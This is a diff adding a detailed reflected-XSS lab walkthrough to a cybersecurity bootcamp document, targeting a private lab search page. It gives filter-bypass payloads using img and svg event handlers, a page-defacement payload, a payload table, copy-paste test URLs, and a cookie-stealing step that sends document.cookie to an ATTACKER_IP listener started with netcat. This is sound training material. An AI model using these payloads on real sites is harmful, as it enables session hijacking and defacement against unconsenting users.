@@ -463,4 +463,244 @@ http://10.10.61.221/search/search?q=%3Cimg%20src=x%20onerror=alert(document.doma
 
 ---
 
+## Detailed Step-by-Step Walkthrough
+
+> **Verified:** March 2026
+
+Follow these exact steps to exploit the XSS vulnerability.
+
+---
+
+### Step 1: Access the XSS Lab
+
+**Open in browser:**
+```
+http://10.10.61.221/search/
+```
+
+You'll see the "ByteWise Developer Blog" homepage with a search box in the navigation bar.
+
+---
+
+### Step 2: Test Normal Search
+
+**In the search box, type:**
+```
+javascript
+```
+
+**Observe the results:**
+
+1. **URL changes to:** `http://10.10.61.221/search/search?q=javascript`
+
+2. **Page title:** `Search: javascript — ByteWise`
+
+3. **Search input value:** The search box now contains `javascript`
+
+4. **Results text:** `Showing results for: javascript`
+
+**Key observation:** The search term is reflected in multiple places on the page!
+
+---
+
+### Step 3: Test Basic `<script>` Tag
+
+**In the search box, enter:**
+```html
+<script>alert(1)</script>
+```
+
+**Or visit URL directly:**
+```
+http://10.10.61.221/search/search?q=<script>alert(1)</script>
+```
+
+**Result:** No alert box appears!
+
+**Check the page source (Ctrl+U):**
+```html
+Showing results for: <strong>alert(1)</strong>
+```
+
+**Analysis:** The `<script>` and `</script>` tags were **stripped out** by a filter! Only `alert(1)` remains as plain text.
+
+---
+
+### Step 4: Bypass Filter with `<img>` Tag
+
+Since `<script>` tags are filtered, use an alternative HTML tag with an event handler.
+
+**In the search box, enter:**
+```html
+<img src=x onerror=alert(1)>
+```
+
+**Or visit URL directly:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror=alert(1)>
+```
+
+**Result:** An alert box appears with "1"!
+
+**Why this works:**
+1. The `<img>` tag is NOT filtered
+2. `src=x` is an invalid image URL
+3. Browser fails to load the image
+4. `onerror` event fires
+5. JavaScript `alert(1)` executes
+
+---
+
+### Step 5: Test SVG Tag Payload
+
+**In the search box, enter:**
+```html
+<svg onload=alert(2)>
+```
+
+**Or visit URL:**
+```
+http://10.10.61.221/search/search?q=<svg onload=alert(2)>
+```
+
+**Result:** Alert box appears with "2"!
+
+The `<svg>` tag with `onload` event also bypasses the filter.
+
+---
+
+### Step 6: Display Document Domain
+
+**Visit URL:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror=alert(document.domain)>
+```
+
+**Result:** Alert box shows `10.10.61.221`
+
+This proves JavaScript is executing in the context of the vulnerable site.
+
+---
+
+### Step 7: Display Cookies
+
+**Visit URL:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror=alert(document.cookie)>
+```
+
+**Result:** Alert box shows any cookies set for this domain.
+
+**Note:** If no cookies are set, the alert will be empty. This is still a successful XSS!
+
+---
+
+### Step 8: Page Defacement
+
+**Visit URL:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror="document.body.innerHTML='<h1 style=color:red;text-align:center;margin-top:200px>HACKED BY XSS</h1>'">
+```
+
+**Result:** The entire page content is replaced with "HACKED BY XSS"!
+
+This demonstrates how XSS can modify the page content.
+
+---
+
+### Step 9: Cookie Stealing Attack (Advanced)
+
+**Step 9.1: Start attacker listener**
+
+On your machine (replace with your IP):
+```bash
+# Using Python
+python3 -m http.server 8888
+
+# Or using netcat
+nc -lvnp 8888
+```
+
+**Step 9.2: Craft the malicious URL**
+
+Replace `ATTACKER_IP` with your machine's IP:
+```
+http://10.10.61.221/search/search?q=<img src=x onerror="fetch('http://ATTACKER_IP:8888/?c='+document.cookie)">
+```
+
+**Step 9.3: URL encode for safety**
+
+```
+http://10.10.61.221/search/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch('http%3A%2F%2FATTACKER_IP%3A8888%2F%3Fc%3D'%2Bdocument.cookie)%22%3E
+```
+
+**Step 9.4: Send to victim**
+
+When victim clicks the link:
+1. Page loads with malicious `<img>` tag
+2. `onerror` triggers JavaScript
+3. `fetch()` sends cookies to your server
+4. You receive: `GET /?c=session_id=abc123...`
+
+---
+
+### Step 10: Verify with curl
+
+**Test that img tag is reflected unescaped:**
+```bash
+curl -s 'http://10.10.61.221/search/search?q=<img%20src=x%20onerror=alert(1)>' | grep "<img"
+```
+
+**Expected output:**
+```html
+<p class="search-query">Showing results for: <strong><img src=x onerror=alert(1)></strong></p>
+```
+
+The `<img>` tag is reflected without encoding - confirming XSS vulnerability!
+
+---
+
+## Working Payloads Summary
+
+| # | Payload | Works? | Purpose |
+|---|---------|--------|---------|
+| 1 | `<script>alert(1)</script>` | ❌ No | Filtered by server |
+| 2 | `<img src=x onerror=alert(1)>` | ✅ Yes | Basic PoC |
+| 3 | `<svg onload=alert(1)>` | ✅ Yes | Alternative tag |
+| 4 | `<img src=x onerror=alert(document.domain)>` | ✅ Yes | Show domain |
+| 5 | `<img src=x onerror=alert(document.cookie)>` | ✅ Yes | Show cookies |
+| 6 | `<img src=x onerror="document.body.innerHTML='HACKED'">` | ✅ Yes | Defacement |
+| 7 | `<img src=x onerror="fetch('http://ATTACKER:8888/?c='+document.cookie)">` | ✅ Yes | Cookie stealing |
+
+---
+
+## Quick Test URLs (Copy & Paste)
+
+**1. Basic XSS Alert:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror=alert('XSS')>
+```
+
+**2. Show Domain:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror=alert(document.domain)>
+```
+
+**3. Show Cookies:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror=alert(document.cookie)>
+```
+
+**4. SVG Payload:**
+```
+http://10.10.61.221/search/search?q=<svg onload=alert('SVG-XSS')>
+```
+
+**5. Page Defacement:**
+```
+http://10.10.61.221/search/search?q=<img src=x onerror="document.body.innerHTML='<h1>HACKED</h1>'">
+```
+
+---
+
 *LeaguesOfCode Cybersecurity Bootcamp 2026*
